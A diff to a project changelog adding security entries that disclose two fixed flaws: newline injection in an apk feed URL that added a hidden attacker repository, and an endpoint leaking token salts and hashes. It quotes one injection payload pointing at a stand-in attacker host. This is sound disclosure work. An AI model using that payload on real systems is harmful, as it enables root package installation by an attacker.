@@ -2,6 +2,32 @@
 
 All notable changes to this project will be documented in this file. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project uses [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Security
+
+- **A feed URL carrying a newline appended a second, hidden apk repository.** `create_feed`
+  anchored its pattern at the start only and wrote the value into
+  `/etc/apk/repositories.d/<name>.list` verbatim, so
+  `{"url": "http://legit/feed\nhttp://attacker/evil"}` produced two repository lines. apk trusts
+  every line, so the injected one is arbitrary package installation as root on the next
+  `apk add` an operator runs, and it was invisible through the API: both read paths parse a
+  single line, so `GET` reported only the first. A token scoped to `packages:feeds` alone
+  therefore reached code execution well outside that scope. Control characters are now rejected
+  and the pattern is anchored at both ends. The same guard already existed for `set_password`
+  and is now shared rather than duplicated.
+
+- **`GET /raw/uapi` returned every token's `salt` and `hash`.** The curated endpoints gate both
+  behind a flag only the internal auth path sets; the passthrough normalised the section
+  verbatim and handed back exactly what they mask. Reaching it requires `raw:uapi` and
+  `uapi:tokens` together, so this was disclosure rather than escalation, and bearers are random
+  and salted, but the material flowed into anything built on a raw read, a config export or a
+  backup being the obvious ones. Stripped now. A replace carries the stored values forward
+  rather than deleting them, since a stripped field cannot come back in a request body and a
+  plain read-modify-write would otherwise have destroyed the credential.
+
+  Both were found by adversarially reviewing 3.0.0-rc1 and are fixed before 3.0.0 final.
+
 ## [3.0.0-rc1] - 2026-08-10
 
 ### Added
